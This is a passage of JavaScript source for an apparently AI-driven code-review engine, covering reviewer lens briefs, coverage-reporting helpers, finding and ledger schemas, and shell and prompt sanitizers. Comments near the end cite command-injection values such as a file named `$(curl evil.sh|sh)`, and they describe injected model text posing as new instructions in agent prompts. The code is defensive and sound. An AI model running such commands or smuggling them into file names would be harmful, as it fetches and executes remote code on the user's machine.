desired != current; (e) a feature-gated path still issues API calls when the feature is disabled, or its error aborts the unrelated primary reconcile; (f) create/patch is chosen off a stale read (read-then-write TOCTOU) with no tolerance for the self-healing race — a 409 / AlreadyExists on create or a 404 on patch/delete becomes a persistent error-requeue loop; (g) a transient error on a secondary/best-effort step is SWALLOWED (mapped to None / Ok / an early return) to protect the primary reconcile, but the pass then returns a no-change / await-event outcome with NO timed requeue — and in exactly that failure mode no watch event fires either (a failed create leaves no object to watch; a failed update/delete emits no event), so an object with no further spec churn never converges the secondary state and the drift is silent. Any swallowed reconcile error must schedule a bounded timed requeue (or surface an explicit needs-requeue outcome), not rely on a watch that will not fire; (h) a cluster-wide or SHARED-CRD typed watch/list uses a strict deserialize (a validating Deserialize, required-without-#[serde(default)] fields, a newtype that rejects apiserver-admissible values) with NO decode-tolerant guard on the stream — one non-conforming object in the store (a hand-made resource, or a foreign object on a CRD this controller co-owns with another operator or with admin-created resources) fails client-side decode on the STREAM and a single decode error on the shared stream can stall reconciliation for EVERY object of that kind, not just the bad one. Any annotation/label filter that runs AFTER deserialization does not help — the decode already broke the stream. Flag it; the fix is a decode-tolerant watch (skip or dead-letter a single undecodable object instead of failing the whole stream) or #[serde(default)]/Option on fields the shared CRD does not require. (Controllers with an admission/validating webhook: cross-check the webhook handler error→decision mapping against the chart ValidatingWebhookConfiguration failurePolicy — a handler that turns Internal/apiserver-error into allowed=false while a code comment or the shipped chart claims failurePolicy: Ignore / "fails open" is a fail-open-vs-fail-closed contradiction: every CREATE/UPDATE then hard-depends on that call and fails CLOSED on a transient hiccup. Read the chart YAML, do not trust the comment.)',
    maintainability: 'maintainability & structural simplification (load the refactoring skill): missed code judo — a behavior-preserving reframing using the existing architecture that would make this change dramatically simpler or delete a whole category of complexity; file pushed across ~700 lines (decomposition smell); ad-hoc conditional / one-off branch / scattered special-case spliced into an unrelated or shared flow instead of a dedicated abstraction; needless optionality (Option that always holds), as-casts where From/TryFrom belongs, Box<dyn Any>/downcasting where a typed model fits. Flag only concrete, behavior-preserving restructurings the author could have taken — not hypothetical rewrites.',
    tests: 'tests as a COVERAGE ADVERSARY (not a presence check): enumerate what a regression could SILENTLY break, then check each has a test that would FAIL on that regression. The litmus test: if you deleted the production line/branch that carries a contract, would the suite still pass green? If yes, that contract is UNTESTED → finding (cite the missing test). Cover, at minimum: (a) every NEW branch and every distinct ERROR CONTRACT the code / handler / OpenAPI (or other documented interface) promises — not-found→404, forbidden / wrong-owner, bad-request→400, conflict→409, a typed 4xx that must not collapse into a 500 — each needs a test asserting THAT status/error, not just the happy path; (b) every SECURITY / AUTHORIZATION boundary — tenant or owner isolation: is there a test exercising a DIFFERENT user/tenant/scope and ASSERTING denial? A single-user happy path does NOT prove isolation; on a NEW authz-guarded endpoint a missing cross-tenant/cross-owner denial test is a HIGH-severity gap; (c) every behavioral CLAIM in the stated spec — identity preserved / "in place", a state that must stay put or transition exactly once, a field that must be scrubbed, an idempotent no-op — each needs a test that pins it and would fail if the claim were violated; (d) self-exclusion / dedup / unlink / bookkeeping guards — a uniqueness check that must exclude the row itself, a back-reference that must be cleared. Vacuous tests (assert!(true), no assertions) count as absent coverage.',
    intent: 'intent / spec conformance: does the change actually do what it is supposed to do? Work from the STATED SPEC / AUTHOR CLAIMS block (the verbatim PR/commit description), not just the one-line inferred intent. ENUMERATE every explicit claim or invariant the author wrote — patterns like "never fails on X", "the only way to Y", "idempotent" / "no-op", "in place" / "preserves Z", "always" / "never", and any documented trade-off — and for EACH claim trace the concrete code path that would carry it out. A claim the code contradicts is a finding (cite the exact file:line that violates it): e.g. an "idempotent no-op" that actually wipes a field, "the only way to change X" that silently no-ops for some inputs, "never fails on X" that returns Err on a transient/non-NotFound error. Also flag correct-looking code with wrong behavior, missed requirements, off-by-one against the spec.',
    invariants: 'domain invariants & lifecycle: before judging a changed operation, read the invariants documented or enforced on the TYPES it manipulates (grep the domain/entity/service modules for doc-comment invariants, status/state enums, `effective_*` / derived getters, `*_scoped` reference ids, validation fns, and transient two-phase lifecycle states — a pending-delete/soft-delete window or an in-progress-mutation state). Flag where the change (a) accepts an entity in a transient/invalid lifecycle state, (b) crosses a scope boundary (a tenant/project/network/address-range) without re-validating or re-deriving the scoped references it carries, (c) uses a raw value where a documented derived/effective quantity is required, (d) mutates/scrubs one field but not a sibling field the same invariant governs, or (e) REIMPLEMENTS an eligibility / capacity / compatibility / authorization check that an EXISTING sibling function already performs — grep for the function doing the same job (a catalog/availability filter, a permission gate, a `*_available` / `filter_*` / `*_has_room` predicate) and diff the new path against it DIMENSION BY DIMENSION; flag any FAIL-CLOSED dimension the sibling enforces but the new path drops (a hardware/family/version compatibility filter, a missing-data→unavailable rule, an overcommit/effective-quantity conversion), because the two gates disagree the moment one is missing a dimension — that is a present correctness bug, not merely future drift. MIRROR WALK (run this when the diff touches a protocol, a state machine, a codec, or any two-sided contract — the finding IS the asymmetry, you do not need a crash to report it): (1) ENUMERATE the invariants the code must uphold — the error enum is the index, each variant names a rule someone decided to enforce, and the spec/RFC and doc comments name the rest; (2) for each invariant GREP EVERY ENFORCEMENT SITE (the guard, the version check, the bounds/limit test, the capability predicate); (3) for each site ask where its MIRROR is and whether it is guarded the same, along four axes — client↔server (the server rejects X, does the client?), send↔receive (the outgoing value is filtered, is the incoming one re-validated?), offered↔accepted (we constrain what we offer, do we constrain what we accept back?), one-param↔all-params (one negotiated parameter is validated, are its siblings — version, algorithm, limit, scope?). Missing siblings travel in packs; (4) DIFF EACH CANDIDATE AGAINST THE LAST RELEASED TAG (`git diff <tag> -- <file>`): a guard PRESENT in the release and GONE at HEAD is a regression, and that raises its severity — say which it is. Report each as: the invariant, enforced-at file:line, missing-mirror-at file:line, which axis, and what the gap lets through downstream (a panic, a silent drop, a downgrade, an accepted-but-should-be-rejected message).',
    compat: 'serialization, persistence & rolling-deploy compatibility: a changed on-the-wire or at-rest representation checked against data written by OTHER versions of the code. Trace every type whose serde/JSON/proto/bincode representation the diff changes — a #[serde(rename)] / field rename / retag / flatten change, a field added without #[serde(default)], a renamed or reordered enum variant, a changed discriminant / repr, a Display/FromStr used as a storage key — AND every place that representation is persisted (JSONB or blob columns, caches, event logs, message-queue payloads, config/state files) or crosses a version boundary. Flag where (a) already-persisted data written under the OLD shape can no longer deserialize under the new shape and no migration backfills it (a rename with no #[serde(alias)], a new required field with no default) — every stored row fails to decode until rewritten; (b) during a ROLLING deploy old and new replicas run CONCURRENTLY, so the representation must be compatible in BOTH directions — new writers must still emit what old readers require (a bare rename breaks old readers: keep the serialized key stable via #[serde(rename = "<old-key>")] on the renamed Rust field, or split the flip across two deploys where all readers understand both keys before any writer flips) AND old writers must emit what new readers accept; (c) a DB migration renames/retypes a column or enum the running code still (de)serializes under the old contract. NOTE: an #[serde(alias = "<old>")] only covers new-code-reads-old-data — it does NOT make old code read new-data during a rollout; call that asymmetry out explicitly.',
    'negative-space': 'negative space / cross-surface interaction: the bug the diff ENABLES in UNCHANGED code. A new status/type/enum-variant/column that pre-existing endpoints mutate blindly; a latent bug in an unchanged helper the diff makes reachable for the first time.',
  },
}
PROFILES.nix = {
  id: 'nix',
  lang: 'Nix',
  detect: (files) => files.some(f => /\.nix$/.test(f) || /(^|\/)flake\.lock$/.test(f)),
  diffGlobs: ["'*.nix'", "'flake.lock'"],
  rubricSkill: 'nix-review',
  fpRules: '',
  rollupRuleIds: [],
  navSkill: '',
  reviewerAgent: 'craft:nix-reviewer',
  securityHints: 'secrets handling (agenix/sops-nix), fetchers/hashes, module security options, or build-script interpolation',
  usesLibrary: false,
  alwaysLenses: ['intent'],
  safetyLens: 'injection',
  scoutRules: `Decide what is "in play" from the diff: derivations / fetchers / hashes → packaging+purity; flake inputs / flake.lock / IFD → reproducibility; string interpolation into build or shell scripts → injection; devShell / direnv / formatters → dev-env; NixOS or home-manager modules / options / secrets → modules; dead or anti-idiomatic Nix → maintainability. ('intent' is enforced by the engine and added automatically — do not count it toward your choices.)`,
  gate: nixGate,
  depContext: nixDepContext,
  lenses: ['purity', 'reproducibility', 'injection', 'packaging', 'dev-env', 'modules', 'maintainability', 'intent'],
  lensBrief: {
    purity: 'purity: impure builtins (currentTime/getEnv/<nixpkgs>), fetchers without a fixed hash — anything that makes a build non-reproducible (PUR-*).',
    reproducibility: 'reproducibility: unpinned/channel inputs, missing flake.lock entries, import-from-derivation (IFD), --impure reliance (REP-*).',
    injection: 'injection: untrusted values interpolated into build or shell scripts; builtins.exec (INJ-*).',
    packaging: 'packaging: mkDerivation correctness — dep hashes (cargoHash/vendorHash/npmDepsHash), builder choice, phases, meta/license (PKG-*).',
    'dev-env': 'dev-env: devShell/direnv correctness, writeShellApplication, the allowUnfree-not-propagated-to-nix-develop gotcha (DEV-*).',
    modules: 'modules: NixOS/home-manager option typing and defaults, cross-platform (Linux+Darwin), secrets kept out of the world-readable store — agenix/sops-nix (MOD-*).',
    maintainability: 'maintainability: dead code (deadnix), anti-idioms (statix), needless rec/with, over-abstraction (MNT-*).',
    intent: 'intent / spec conformance: does the change do what it should? Work from the STATED SPEC / AUTHOR CLAIMS block (the verbatim PR/commit description), not just the one-line inferred intent. ENUMERATE every explicit claim or invariant the author wrote — patterns like "never fails on X", "the only way to Y", "idempotent" / "no-op", "in place" / "preserves Z", "always" / "never", documented trade-offs — and for EACH claim trace the concrete code path that would carry it out; a claim the code contradicts is a finding (cite the exact file:line). Also flag correct-looking code with wrong behavior.',
    'negative-space': 'negative space / cross-surface interaction: the breakage the diff ENABLES in UNCHANGED Nix — a renamed option or output that existing modules/consumers still reference; a changed default that unchanged config relies on.',
  },
}

// ================= Coverage honesty =================
// A verdict must never claim more coverage than the run had. The engine only knows the profiles
// declared above; everything else in a diff is UNREVIEWED, and saying so is the whole point of the
// helpers below. They are pure and live in the declarations prefix so they can be unit-tested.

// The human-readable roster of what the engine can review, named in every coverage message so a
// caller reading "nothing was reviewed" also learns what would have been.
function supportedLangLabel() {
  return Object.values(PROFILES).map(p => p.lang).join('/')
}

// A pin naming an id that does not exist used to be dropped by `filter(Boolean)` — silently — and
// the run then fell into "no language matched" and returned a green Approve over an unreviewed
// diff. Split the pin into known/unknown instead and let the caller refuse to proceed.
// `requested` arrives from workflow args and is NOT trusted to be an array: a scalar `languages:
// 'rust'` and a JSON-decoded string are both known argument-transport shapes here. Normalise first —
// the old `includes` form tolerated a string by accident, and calling `.filter` on one threw a
// TypeError that aborted the whole review. Degrade toward running the review, never toward crashing:
// an unusable shape (empty list, object, number) is treated as "no pin at all".
function resolveProfilePin(requested) {
  if (!requested) return { pinned: null, unknown: [] }
  const list = (Array.isArray(requested) ? requested : [requested])
    .filter(id => typeof id === 'string')
    .map(id => id.trim().toLowerCase())
    .filter(Boolean)
  if (!list.length) return { pinned: null, unknown: [] }
  return { pinned: list.filter(id => !!PROFILES[id]), unknown: list.filter(id => !PROFILES[id]) }
}

function unknownPinMessage(unknown) {
  const q = xs => xs.map(x => `\`${x}\``).join(', ')
  return `unknown language pin ${q(unknown)} — available: ${q(Object.keys(PROFILES))}`
}

function noLanguageMessage(fileCount, materialCount = fileCount) {
  return `NOTHING WAS REVIEWED — none of the ${fileCount} changed file(s) match a supported language profile (this engine reviews ${supportedLangLabel()} only), and ${materialCount} of them carry reviewable content that therefore went unreviewed. This is not an approval: no lens ran and no finding could have been produced.`
}

// A diff that came back with NO files at all. Reachable legitimately — an already-merged branch, a
// `path` scope matching nothing — and also when detection half-failed, which is why this stays
// INCOMPLETE rather than green. But it is not a coverage hole: describing it with
// noLanguageMessage(0, 0) produced "none of the 0 changed file(s) … and 0 of them went unreviewed",
// a hole of size zero, which is self-contradictory and teaches readers to ignore the marker.
function noChangedFilesMessage() {
  return `NOTHING WAS REVIEWED — the diff came back EMPTY: no changed file was detected against the resolved base. Either there is genuinely nothing to review here (an already-merged branch, or a \`path\` scope that matches nothing) or the base/scope is wrong and detection failed. No lens ran, so this is not an approval — check the base and re-run.`
}

// Which unreviewed files actually lower the claim. Derived from the path alone and deliberately
// conservative: when in doubt a file is MATERIAL. A false "material" costs one honest INCOMPLETE
// marker; a false "inert" costs a silent overclaim, which is the bug this whole section exists to
// prevent. Three narrow exemptions only — prose/asset extensions, lockfiles matched by their real
// names, and artifacts whose path makes it unambiguous that a generator wrote them.
const INERT_EXT = /\.(md|markdown|rst|adoc|svg|png|jpe?g|gif|ico|webp|pdf|woff2?|ttf|otf)$/i
const INERT_NAMES = new Set([
  'license', 'licence', 'notice', 'codeowners', '.gitignore', '.gitattributes',
  // Inert `.txt` files by NAME, not by extension. A blanket `.txt` rule was the lockfile bug again
  // in another costume: `CMakeLists.txt`, `requirements.txt`, `conanfile.txt` and `Dependencies.txt`
  // are build-system and dependency SOURCE, and a diff of nothing but those took the green
  // "nothing needed reviewing" return. When in doubt, material.
  'license.txt', 'licence.txt', 'notice.txt', 'copying.txt', 'authors.txt', 'contributors.txt',
  'changelog.txt', 'changes.txt', 'readme.txt', 'robots.txt', 'humans.txt', 'todo.txt', 'notes.txt',
  // Lockfiles, by the names they actually have. Matching a *shape* like `*lock.*` swallowed source
  // code — `db/lock.sql`, `src/lock.rs`, `internal/spin-lock.go` — and silently exempted it.
  'package-lock.json', 'npm-shrinkwrap.json', 'pnpm-lock.yaml', 'yarn.lock', 'bun.lockb', 'bun.lock',
  'cargo.lock', 'flake.lock', 'poetry.lock', 'pdm.lock', 'uv.lock', 'pipfile.lock', 'gemfile.lock',
  'composer.lock', 'go.sum', 'deno.lock', 'mix.lock', 'pubspec.lock', 'podfile.lock', 'packages.lock.json',
  'gradle.lockfile', 'cabal.project.freeze', 'conan.lock', 'herd.lock',
])
// Generated artifacts. Only where the PATH itself is unambiguous — a generator-stamped suffix or a
// directory whose whole purpose is generated output. A hand-written file never lives here.
const GENERATED_PATH = /(^|\/)(__generated__|generated|node_modules|vendor)\//i
const GENERATED_FILE = /(\.snap|\.min\.(js|css|mjs|cjs)|\.pb\.(go|cc|h|rs|ts)|_pb2(_grpc)?\.py|\.gen\.(go|rs|ts)|\.generated\.[a-z0-9]+|\.g\.dart)$/i

function isInertUncovered(f) {
  const base = String(f).split('/').pop().toLowerCase()
  return INERT_EXT.test(f) || INERT_NAMES.has(base) || GENERATED_PATH.test(f) || GENERATED_FILE.test(f)
}

function materialUncovered(files) {
  return files.filter(f => !isInertUncovered(f))
}

// The other half of the no-profile case: a diff whose changed files are ALL inert (prose, assets,
// lockfiles, generated output). Nothing was reviewed AND nothing needed reviewing — a different
// statement from "files went unreviewed", and it must not be dressed up as a coverage hole. A
// marker that fires on every README-only change stops being read, which destroys the value of the
// marker on the diffs that do hide unreviewed code.
function nothingToReviewMessage(fileCount) {
  return `NOTHING NEEDED REVIEWING — all ${fileCount} changed file(s) are documentation, assets, lockfiles or generated output; none carries reviewable code. No lens ran because none had anything to look at.`
}

function uncoveredNotRunNote(material) {
  const shown = material.slice(0, 5).join(', ')
  return `${material.length} changed file(s) matched no language profile and were NOT reviewed (${shown}${material.length > 5 ? `, +${material.length - 5} more` : ''})`
}

// ---- shared schemas ----
const FINDING_ITEM = {
  type: 'object',
  additionalProperties: false,
  required: ['severity', 'title', 'file', 'line', 'why', 'fix', 'blastRadius', 'source', 'ruleId', 'whereChecked'],
  properties: {
    severity: { type: 'string', enum: ['Critical', 'High', 'Medium', 'Low', 'Info'] },
    title: { type: 'string', description: 'one-line what is wrong' },
    file: { type: 'string', description: 'path; empty string if not applicable' },
    line: { type: 'integer', description: '1-based line; 0 if not applicable' },
    why: { type: 'string', description: 'why it matters' },
    whereChecked: { type: 'string', description: 'OFF-SITE EVIDENCE: the file:line you actually opened to establish a load-bearing premise that lives OUTSIDE the cited defect site — a dependency\'s behaviour, reachability from an entry point, the absence of a guard in a caller, what a sibling path does. Several may be comma-separated, each with a few words on what it shows. Empty string ONLY when the finding is fully self-contained at the cited file:line and rests on no off-site claim' },
    fix: { type: 'string', description: 'direction of the fix' },
    blastRadius: { type: 'string', description: 'callers affected / breaking-change note; empty if n/a' },
    source: { type: 'string', description: 'lens name or tool name that produced this' },
    ruleId: { type: 'string', description: 'catalog rule ID from the active profile\'s rules.md (e.g. "CON-003" for rust, "PUR-001" for nix) if the finding maps to one; empty string otherwise' },
    fp: { type: 'string', description: 'line-tolerant fingerprint; empty if not from a ledger' },
    symbol: { type: 'string', description: 'enclosing fn/type name; empty if unknown' },
    tier: { type: 'string', description: 'confirmed|suspected|refuted; empty if n/a' },
    disposition: { type: 'string', description: 'open|closed|rejected|justified|deferred; empty if n/a' },
  },
}

// The persisted ledger entry has its OWN shape (the 11 required fields `toLedgerEntry` always writes,
// plus an OPTIONAL `sources` — see below) — NOT FINDING_ITEM. Reusing FINDING_ITEM here would require
// `fix`/`blastRadius` (which the ledger omits), so a strict validator could reject the loader's output
// and null out `priorRound`, silently degrading a re-review to a first pass. `sources` is optional (not
// in `required`) so pre-existing ledgers written without it still validate; it is persisted so the
// strict-mode maintainability escalation (isMaintainability's merged-`sources` clause) survives a
// re-review — without it the reconstructed prior has no `sources` and the escalation silently no-ops.
const LEDGER_ITEM = {
  type: 'object',
  additionalProperties: false,
  required: ['fp', 'file', 'line', 'symbol', 'severity', 'tier', 'disposition', 'source', 'ruleId', 'title', 'why'],
  properties: {
    fp: { type: 'string' },
    file: { type: 'string' },
    line: { type: 'integer' },
    symbol: { type: 'string' },
    severity: { type: 'string' },
    tier: { type: 'string' },
    disposition: { type: 'string' },
    source: { type: 'string' },
    sources: { type: 'array', items: { type: 'string' } },
    ruleId: { type: 'string' },
    title: { type: 'string' },
    why: { type: 'string' },
  },
}

const PRIOR_ROUND_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['found', 'round', 'head', 'ledger', 'ledgerCount', 'priorFindings', 'reason'],
  properties: {
    found: { type: 'boolean' },
    round: { type: 'integer', description: 'the prior round number; 0 when found=false' },
    head: { type: 'string', description: 'prior HEAD sha; empty when found=false' },
    ledger: { type: 'array', items: LEDGER_ITEM, description: 'prior findings with fp/symbol/tier/disposition; empty when found=false' },
    ledgerCount: { type: 'integer', description: 'the ledger length the script computed — copy it as printed; the workflow checks it against the array it received and treats a mismatch as a truncated transport' },
    reason: { type: 'string', description: 'why there is no prior round (no-store, no-index, no-candidate-rows, unattributable-rows-only, ancestry-rejected, detail-unreadable, partial-only, git-unavailable); empty when found=true' },
    priorFindings: { type: 'integer', description: 'total findings the prior round reported (its record findings.total); 0 when found=false or unknown — used to detect a round that found bugs but persisted no ledger' },
  },
}

const DETECT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['baseRef', 'files', 'spec', 'branch', 'head', 'notes'],
  properties: {
    baseRef: { type: 'string', description: 'git ref the diff was computed against; empty if none resolved' },
    files: { type: 'array', items: { type: 'string' }, description: 'changed file paths in the diff' },
    spec: { type: 'string', description: 'verbatim change description — the open PR title+body, else the commit messages on the diff range; truncated to ~4000 chars; empty string if none' },
    branch: { type: 'string', description: 'current git branch name; empty string if detached HEAD' },
    head: { type: 'string', description: 'current HEAD short SHA; empty string if not a git repo' },
    notes: { type: 'string', description: 'one line on what was detected' },
  },
}

const SCOUT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['sizeBucket', 'lenses', 'maxRounds', 'verifyVotes', 'lensModel', 'isLibrary', 'securitySensitive', 'intent', 'churn', 'notes'],
  properties: {
    sizeBucket: { type: 'string', enum: ['small', 'medium', 'large'] },
    lenses: { type: 'array', items: { type: 'string' }, description: 'subset of the profile lens catalog to run' },
    maxRounds: { type: 'integer', description: 'loop-until-dry cap: 1 for small, 2 for medium, 3 for large' },
    verifyVotes: { type: 'integer', description: 'skeptic votes for CRITICAL/HIGH findings (1 or 3); default-tier findings always get 1' },
    lensModel: { type: 'string', enum: ['sonnet', 'opus'], description: 'model for lens + verify agents' },
    isLibrary: { type: 'boolean', description: 'true if a published library (→ semver-checks); always false where not applicable' },
    securitySensitive: { type: 'boolean' },
    intent: { type: 'string', description: 'what the change should do, from the brief/args; empty if unknown' },
    churn: { type: 'array', items: { type: 'string' }, description: 'hot/often-changed files to scrutinize; may be empty' },
    notes: { type: 'string', description: 'one line on what was detected' },
  },
}

const GATE_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['status', 'provenance', 'failedChecks', 'carriedChecks', 'seedFindings', 'notes'],
  properties: {
    status: { type: 'string', enum: ['pass', 'fail', 'unknown'] },
    provenance: { type: 'string', description: 'e.g. "build/test/clippy/fmt via CI #123; audit/deny local"' },
    failedChecks: { type: 'array', items: { type: 'string' } },
    carriedChecks: { type: 'array', items: { type: 'string' }, description: 'red checks that are REAL but not attributable to this diff (pre-existing dependency advisories on a diff that touches no manifest). Reported, never gate-failing.' },
    seedFindings: { type: 'array', items: FINDING_ITEM },
    notes: { type: 'string' },
  },
}

const FINDINGS_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['lens', 'findings'],
  properties: {
    lens: { type: 'string' },
    findings: { type: 'array', items: FINDING_ITEM },
  },
}

const VERDICT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['refuted', 'citedLineMatches', 'reachable', 'premiseSupported', 'reason'],
  properties: {
    refuted: { type: 'boolean', description: 'true if the finding does not hold up' },
    citedLineMatches: { type: 'boolean', description: 'true if the cited file:line actually contains what the finding claims' },
    reachable: { type: 'boolean', description: 'true if the path is reachable in production (not test/example-only)' },
    premiseSupported: { type: 'boolean', description: 'true if the load-bearing premise is either self-contained at the cited line or actually shown by the code at whereChecked; false if it is an off-site claim with no evidence that checks out' },
    reason: { type: 'string' },
  },
}

const CRITIC_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['missingLenses', 'notes'],
  properties: {
    missingLenses: { type: 'array', items: { type: 'string' }, description: 'lenses from the candidate list that should also run; empty if coverage is complete' },
    notes: { type: 'string', description: 'one line on anything else likely missed, or "coverage complete"' },
  },
}

const CHANGED_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['changed', 'reason'],
  properties: { changed: { type: 'boolean' }, reason: { type: 'string' } },
}
const ADJUDICATE_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['status', 'currentLine', 'note', 'invariant', 'attack'],
  properties: {
    status: { type: 'string', enum: ['resolved', 'still-open', 'regressed'] },
    currentLine: { type: 'integer', description: 're-located 1-based line; 0 if not found' },
    note: { type: 'string' },
    invariant: { type: 'string', description: 'one-sentence invariant the finding violated' },
    attack: { type: 'string', description: 'the successful attack on the fix; empty string if every attack failed' },
  },
}
// Red-team verdict on a "resolved" Critical/High prior: an independent attempt to defeat the fix.
const ATTACK_SCHEMA = {
  type: 'object', additionalProperties: false, required: ['defeated', 'attack'],
  properties: {
    defeated: { type: 'boolean', description: 'true only if a concrete input/state defeats the fix' },
    attack: { type: 'string', description: 'the concrete input/state and why it slips past the fix; empty if none found' },
  },
}

// ---- adjudicate-track text hygiene (pure helpers; declared in the prefix so tests can eval them) ----
// Model "attack"/"note" text is persisted into the ledger `why`, re-interpolated into next-round
// prompts, and rendered in the report — cap it and strip newline/markdown structure so runaway or
// injected output cannot restyle the report or compound across re-review rounds.
// The craft release that produced a run. Recorded on every run record and index line so an
// aggregate can be filtered to ONE engine version: without it, "did tightening that lens help?"
// is unanswerable, because the numbers blend runs from every rubric the store has ever seen.
// MUST match `.claude-plugin/plugin.json` — `lib/check-workflows.mjs` fails the build if it drifts.
// Pair it with craftCommit (the engine's git HEAD, added by the logger): the version identifies a
// release, the commit separates two runs of the same release while the rubric is being edited.
const CRAFT_VERSION = '0.16.0' // x-release-please-version
const ATTACK_MAX = 500
// Severity ordering, worst first. Lives in the declarations prefix (not next to its first use in
// dedupPool) so severity-ranking helpers stay unit-testable — the test harness evals this prefix.
const SEV_RANK = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
// One-notch severity demotion (test-only reachability). In the declarations prefix alongside
// SEV_RANK so the severity helpers stay unit-testable.
const DEMOTE = { Critical: 'High', High: 'Medium', Medium: 'Low', Low: 'Info', Info: 'Info' }
function sanitizeAttack(text) {
  // Also break the baseWhy marker DELIMITER: collapse the ` — ` that precedes a `fix incomplete` /
  // `REGRESSED after fix` marker word to a plain space. The words survive (no content loss) but the
  // exact ` — <marker>: ` shape baseWhy parses is gone — so an attack/note that echoes a marker can
  // no longer re-introduce a parseable marker that would accrete a stale fragment each re-review round.
  const flat = String(text ?? '').replace(/[\r\n]+/g, ' ').replace(/[#`*_[\]<>|]/g, '')
    .replace(/ — (?=fix incomplete|REGRESSED after fix)/gi, ' ').trim()
  return flat.length > ATTACK_MAX ? `${flat.slice(0, ATTACK_MAX)}…` : flat
}
// Model-authored finding fields reach agent PROMPTS as context. The injection vector in a
// single-value prompt field is the NEWLINE (it lets injected text pose as a fresh instruction line);
// markdown structure chars are inert there. So flatten newlines (the vector) while PRESERVING
// identifier characters `_ < > [ ]`: symbols (`handle_request`, `Vec<T>`) and paths
// (`src/review_adjudicate.rs`) carry them and they are LOAD-BEARING — the adjudicate/red-team prompts
// tell the agent to grep the symbol/file to RELOCATE the finding, so mangling them (as sanitizeAttack's
// strip set did) breaks the grep. flattenField neutralizes newlines and caps length while leaving those
// chars intact. Ledger storage stays raw (matchesPrior fingerprints on the unsanitized ruleId+title) —
// only the prompt copy is flattened. The `git diff` shell argument is a SHELL value, not a prompt
// value, so it is NOT routed through flattenField — it is single-quoted with shq(). JSON.stringify does
// NOT make it shell-safe: it only escapes `"`/`\`/control chars, and inside a double-quoted shell
// context `$(...)`, backtick and `$VAR` still expand, so a file literally named `$(curl evil.sh|sh)`
// would execute when the carry agent runs the command. shq() single-quotes it, disabling all expansion.
function flattenField(v) { return String(v ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, ATTACK_MAX) }
function promptFields(f) {
  return {
    title: flattenField(f.title),
    symbol: flattenField(f.symbol) || '?',
    ruleId: flattenField(f.ruleId) || '—',
    file: flattenField(f.file),
    severity: flattenField(f.severity),
    // A locator field like file/symbol: paths and identifiers are load-bearing (the verifier is
    // told to OPEN it), so flatten newlines but keep `_ < > [ ]` intact — see flattenField.
    whereChecked: flattenField(f.whereChecked),
  }
}
// POSIX single-quote shell-escaper for a model-authored value that lands in a shell command a
// sub-agent will RUN (the carry/adjudicate `git diff -- <path>`). Single quotes disable ALL shell
// expansion, so `$(...)`, backtick, `$VAR`, spaces and `;`/`|`/`&` inside are literal. The `'\''`
// sequence (close-quote, escaped-quote, reopen-quote) safely embeds a literal single quote. Note:
// JSON.stringify does NOT make a value shell-safe — it only escapes `"`/`\`/control chars, and inside
// a double-quoted shell context `$(...)`, backtick and `$VAR` still expand; single-quoting is what
// neutralizes them.
function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
// A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
// interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
// shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
// fails — it carries a space and `$()`. Used at the prior-round LOAD boundary to fall back to a safe
// default without disabling re-review; the use sites additionally shq()/flattenField() it (defense in depth).
function isCommitish(s) {
  const v = String(s ?? '').trim()
  if (!v) return false
  if (/^[0-9a-fA-F]{7,40}$/.test(v)) return true
  return /^[A-Za-z0-9][A-Za-z0-9._/-]{0,199}$/.test(v)
}
// A still-open/regressed prior re-enters the next round's ledger with a suffix appended to `why`.
// Strip any PRIOR suffix first so stale attacks do not accrete and bias future adjudications (the
// adjudicator and red-team derive the invariant from `why`). Honest invariant: `why` carries the
// original rationale plus at most the LATEST attack. We strip on the LAST marker only (so a rationale
// that legitimately QUOTES a marker phrase is not truncated). Attack/note text cannot re-introduce a
// parseable marker: sanitizeAttack now breaks the ` — <marker>: ` delimiter (collapses the em-dash),
// so the ONLY markers in `why` are the real per-round appends plus any in the original (unsanitized)
// rationale. The LAST-marker split then both PREVENTS accretion (each round strips the prior append
// before re-appending — `why` is stable round-over-round) AND preserves a rationale that quotes a marker.
function baseWhy(why) {
  const s = String(why ?? '').replace(/ \(reopened: [^)]*\)\s*$/, '')
    .replace(/ — still-open \(adjudicator did not run[^)]*\)\s*$/, '')
    .replace(/ — REGRESSED after fix \(no detail[^)]*\)\s*$/, '')
  const re = / — (?:fix incomplete(?: \([^)]*\))?|REGRESSED after fix): /g
  let last = -1, m
  while ((m = re.exec(s))) last = m.index
  return last === -1 ? s : s.slice(0, last)
}

// Case-insensitive Critical/High gate. LEDGER_ITEM.severity has no enum (deliberately — clamping it
// would fail the whole prior-round ledger load and silently degrade re-review to a first pass), so a
// drifted `critical`/`CRITICAL` value must still trip the red-team gate. Exact-match `=== 'Critical'`
// would silently skip red-team on such a prior.
function isHighSeverity(sev) { return ['critical', 'high'].includes(String(sev ?? '').trim().toLowerCase()) }

// Canonicalize a ledger severity ONCE at the prior-round load boundary. LEDGER_ITEM.severity has no
// enum, so a drifted `critical`/`CRITICAL` reaches the load: the case-insensitive gates (isHighSeverity)
// still fire on it, but every VERDICT/COUNT function (countBySeverity, reviewVerdict/finalVerdict/
// rereviewVerdict, and the strict re-review escalation) matches severity by EXACT case and would
// silently bucket it as 0 Critical/0 High — a fail-open that clears a still-broken Critical fix.
// Mapping known values to canonical case here (and passing an unknown value through, trimmed — never
// dropping it) means EVERY downstream comparison sees canonical severity for priors.
const CANON_SEVERITY = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low', info: 'Info' }
function canonicalSeverity(sev) { return CANON_SEVERITY[String(sev ?? '').trim().toLowerCase()] || String(sev ?? '').trim() }

// Pure red-team verdict handling for a "resolved" Critical/High prior. Returns the possibly-
// adjusted adjudication plus degradation flags; the caller does the logging/counting.
function classifyRedTeam(f, adj, rt) {
